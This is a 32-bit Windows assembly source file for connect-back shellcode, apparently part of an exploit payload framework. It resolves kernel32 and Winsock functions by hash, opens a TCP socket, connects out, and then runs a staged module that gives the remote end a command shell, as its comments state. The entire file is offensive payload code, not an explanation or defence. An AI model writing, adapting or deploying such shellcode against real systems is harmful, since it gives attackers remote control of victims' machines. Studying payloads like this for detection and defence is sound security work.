BITS 32

%include "_kernel32_init.asm"
%include "_wsa_init.asm"
%include "stage_wsa_shell.asm"

; hash up kernel32 foo
KERNEL32_INIT 0

; setup the address table
%define _WSA_INIT_TBLEN 3

%macro _WSA_INIT_TB 0
  _WSA_INIT_TB_CONNECT
  _WSA_INIT_TB_WSASOCK
  _WSA_INIT_TB_WSASTART
%endmacro

; setup ebp for WSAStartup data
push BYTE 20  ; push 20
pop eax       ; register
mul eax       ; square that shit = 0x190
sub esp, eax  ; make room for WSAStartup data
mov ecx, esp
; setup ebp for address table
sub esp, BYTE (_WSA_INIT_TBLEN * 4)
push edi      ; [ebp + 8] = LoadLibraryA
push esi      ; [ebp + 4] = LGetProcAddress
push ebx      ; [ebp + 0] = kernel32 dll base
mov ebp, esp
push ecx      ; push WSAStartup data address
push eax      ; push 0x190

; hash the table
WSA_HASH_WINSOCK

; call WSAStartup
WSA_CALL_WSASTART

; call WSASocketA, get a tcp socket (screw the stack)
WSA_CALL_SOCKET 0, 'tcp'

; we got the socket in edi

WSA_CALL_CONNECT 0

; ebp is still setup right, and so is edi, lets get a shell!
STAGE_WSA_SHELL 1  ; resolve it's own functions
